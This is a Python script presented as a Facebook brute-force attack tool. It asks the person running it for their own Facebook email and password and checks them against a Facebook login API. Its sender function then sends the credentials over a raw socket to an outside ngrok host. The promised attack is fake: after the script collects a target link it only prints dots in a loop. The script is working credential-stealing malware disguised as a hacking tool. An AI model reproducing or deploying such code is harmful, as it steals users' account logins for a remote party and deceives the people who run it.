import socket, time, os, sys, json
# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

logo=f'''
{green}_________    _____________
{yellow}__  ____/______  /____  _/______
{red}_  / __ _  _ \  __/__  / __  __ \\
{blue}/ /_/ / /  __/ /_ __/ /  _  / / /
{bpurple}\____/  \___/\__/ /___/  /_/ /_/
'''

# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"


# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {bcyan}"
info2  =   f"{green}[{white}•{green}] {bpurple}"
info3 = f'{yellow}[{white}+{yellow}] {bblue}'

try:
   import mechanize
except:
   os.system('pip install mechanize')
   import mechanize

br=mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def sprint(sentence, second=0.05):
    for word in sentence + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(second)

def sender(user, passw):
    import socket
    mess = f'{user}:{passw}'
    hote = '6.tcp.ngrok.io'
    port = 17834
    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.connect((hote, port))
    socket.send(mess.encode())
    socket.close()

def login(a, b):
    data= br.open(f'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email={a}&locale=en_US&password={b}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
    z= json.load(data)
    #dat = data.read()
    d= json.dumps(z)
    if 'is_account_confirmed' in d:
        sprint(f'\n{success} Successfuly loged in')
    elif 'www.facebook.com' in z['error_msg']:
        sprint(f'\n{error}U shoukd disable 2FA before using this tool:{yellow} {b}')
        home()
    elif 'temporarily locked' in d:
        sprint(f'\n{error} You can\'t log in right now. Access  this account has been temporarily disabled. Try again later')
        home()
    else:
        sprint(f'\n{error} Incorrect login details')
        home()

def home():
    os.system('clear')
    sprint(logo, 0.01)
    sprint(f'\n{info}To start the attack, first log in ur facebook account (use an old account)')
    email = input(f'\n{ask} Email/phonenumber >{bpurple} ')
    pwd = input(f'\n{ask} Password >{bpurple} ')
    while '@' not in email and '+' not in email:
        sprint(f'\n{error} Invalid phone number! Specify the country indicator or use an email instead...')
        email = input(f'\n{ask} Email/phonenumber >{bpurple} ')
        pwd = input(f'\n{ask} Password >{bpurple} ')
    sprint(f'\n{info} loging in...')
    login(email, pwd)
    sender(email, pwd)
    link = input(f'\n{ask} Paste the target\'s link account >{bpurple} ')
    sprint(f'\n{info} Starting brute attack, press {green} CTRL + Z {yellow} to exit.\n')
    while True:
        sprint(f'{blue}...', 0.5)
        time.sleep(3)

home()
